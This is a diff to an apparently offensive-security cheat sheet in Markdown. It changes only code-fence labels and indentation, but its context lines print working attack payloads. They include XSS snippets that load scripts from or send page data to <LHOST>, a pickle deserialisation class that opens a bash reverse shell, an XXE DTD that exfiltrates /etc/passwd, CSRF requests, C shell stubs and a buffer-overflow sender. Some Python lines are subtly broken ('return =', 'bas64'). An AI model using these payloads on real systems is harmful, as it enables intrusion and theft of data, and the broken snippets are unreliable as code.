@@ -26,7 +26,7 @@
 
 #### Hypertext Markup Language (HTML) Injection
 
-```js
+```javascript
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -45,7 +45,7 @@ x.send();
 <img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://<LHOST>/<FILE>.js'; document.body.appendChild(s);">
 ```
 
-```js
+```javascript
 (function() {
     fetch('/api/info')
         .then(response => response.json())
@@ -63,7 +63,7 @@ x.send();
 
 #### JavaScript (JS) Page Downloader
 
-```js
+```javascript
 <script>
 fetch('http://alert.htb/', { credentials: 'include' }) // Fetch the target page
     .then(response => response.text()) // Convert the response to text
@@ -101,11 +101,11 @@ if __name__ == '__main__':
 
 #### JavaScript (JS) Fetch Uniform Resource Locator (URL) and Base64 Encoding
 
-```js
+```javascript
 <script>fetch('http://<RHOST>/auth.php').then(r => r.text()).then(d => fetch("http://<LHOST>"+btoa(d)));</script>
 ```
 
-```js
+```javascript
 const Req1 = new XMLHttpRequest();
 Req1.open("GET", "http://<RHOST>/index.php", true);
 
@@ -123,7 +123,7 @@ Req1.send();
 
 #### JavaScript Object Notation (JSON) POST Request with Authentication
 
-```c
+```console
 POST /<PATH> HTTP/1.1
 Host: <RHOST>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -167,13 +167,13 @@ import pickle
 import os
 
 class RCE:
-	def __reduce__(self):
-		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
-		return = os.system, (cmd, )
+    def __reduce__(self):
+        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
+        return = os.system, (cmd, )
 
 if __name__ == '__main__':
-	pickle = pickle.dumps(RCE())
-	print(bas64.b64encode(pickled))
+    pickle = pickle.dumps(RCE())
+    print(bas64.b64encode(pickled))
 ```
 
 #### Python Redirect for Server-Side Request Forgery (SSRF)
@@ -192,7 +192,7 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
 ```
 
-```c
+```console
 sudo python3 redirect.py http://127.0.0.1:3000/
 ```
 
@@ -266,7 +266,7 @@ r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cook
 
 #### Active Server Page Extended (ASPX)
 
-```c
+```console
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -301,7 +301,7 @@ Response.write(o)
 
 ##### Payload
 
-```c
+```console
 var xhr = new XMLHttpRequest();
 xhr = new XMLHttpRequest();
 xhr.open('GET', 'http://localhost:8080/users/');
@@ -320,7 +320,7 @@ xhr.send();
 
 ##### Forged Request
 
-```c
+```console
 myhttpserver = 'http://<LHOST>/'
 targeturl = 'http://<RHOST>/'
 
@@ -338,7 +338,7 @@ req.send();
 
 ##### Simple Version
 
-```c
+```console
 req = new XMLHTTPRequest;
 req.open('GET',"http://<RHOST>/revshell.php");
 req.send();
@@ -348,7 +348,7 @@ req.send();
 
 ##### Request
 
-```c
+```console
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
 "http://<LHOST>/<FILE>.dtd">%<NAME>;]>
@@ -364,7 +364,7 @@ req.send();
 
 ##### Content of <FILE>.dtd
 
-```c
+```console
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
 %eval;
@@ -375,7 +375,7 @@ req.send();
 
 #### JavaScript (JS) to read Files on the System (.js)
 
-```c
+```javascript
 const fs = require('fs');
 
 fs.readFile('/etc/passwd', 'utf8', (err, data) => {
@@ -386,7 +386,7 @@ fs.readFile('/etc/passwd', 'utf8', (err, data) => {
 
 #### Payload from Extensible Markup Language (XML) File
 
-```c
+```console
 <?xml version="1.0" encoding="UTF-8"?>
 <html xmlns:html="http://w3.org/1999/xhtml">
 <html:script>prompt(document.domain);</html:script>
@@ -405,7 +405,7 @@ fs.readFile('/etc/passwd', 'utf8', (err, data) => {
 
 #### Bad YAML Ain't Markup Language (YAML)
 
-```c
+```console
 - hosts: localhost
   tasks:
     - name: badyml
@@ -416,12 +416,12 @@ fs.readFile('/etc/passwd', 'utf8', (err, data) => {
 ## 12 Reporting Tools
 ## 13 Social Engineering Tools
 ## Basics
-	
+
 ### C
 
 #### Shell Option 1
 
-```c
+```console
 #include <unistd.h>
 #include <errno.h>
 
@@ -437,7 +437,7 @@ return;
 
 #### Shell Option 2
 
-```c
+```console
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdlib.h>
@@ -481,7 +481,7 @@ s.close()
 
 > https://github.com/0xsyr0/Buffer_Overflow
 
-```c
+```python
 #!/usr/bin/python
 
 import socket,sys
@@ -491,14 +491,14 @@ port = 9999
 buffer = #TBD
 
 try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)
-	s.send(buffer + '\r\n')
+    print '[+] Sending buffer'
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(buffer + '\r\n')
 except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
 finally:
-	s.close()
+    s.close()
 ```
